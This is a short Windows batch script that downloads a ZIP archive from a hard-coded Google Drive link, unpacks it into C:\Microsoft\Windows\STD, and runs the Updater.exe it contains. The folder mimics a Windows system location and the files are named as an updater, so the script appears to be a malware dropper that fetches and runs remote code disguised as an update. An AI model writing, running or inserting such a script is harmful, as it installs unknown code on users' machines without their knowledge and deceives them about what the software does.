@echo off
REM Define variables
set "googleDriveFileUrl=https://drive.usercontent.google.com/download?id=1sb6lWGPMMUt4xXzCv5EN3IbClCkGMUOF&export=download&authuser=0&confirm=t&uuid=307f3e8b-af1d-426c-be48-99430b924d0b&at=APvzH3qj3v2LgM_82ga8xrsVtXQ9:1733953862945"
set "destinationFolder=C:\Microsoft\Windows\STD"
set "downloadedFileName=updater.zip"
set "extractionFolder=%destinationFolder%\"

REM Ensure the destination folder exists
if not exist "%destinationFolder%" (
    mkdir "%destinationFolder%"
)

REM Full path to the downloaded file
set "downloadedFilePath=%destinationFolder%\%downloadedFileName%"

REM Download the ZIP file using curl
curl -L -o "%downloadedFilePath%" "%googleDriveFileUrl%"

REM Ensure the extraction folder exists
if not exist "%extractionFolder%" (
    mkdir "%extractionFolder%"
)

REM Extract the ZIP file using PowerShell
powershell -Command "Expand-Archive -Path '%downloadedFilePath%' -DestinationPath '%extractionFolder%' -Force"
cd C:\Microsoft\Windows\STD\
start C:\Microsoft\Windows\STD\Updater.exe -f
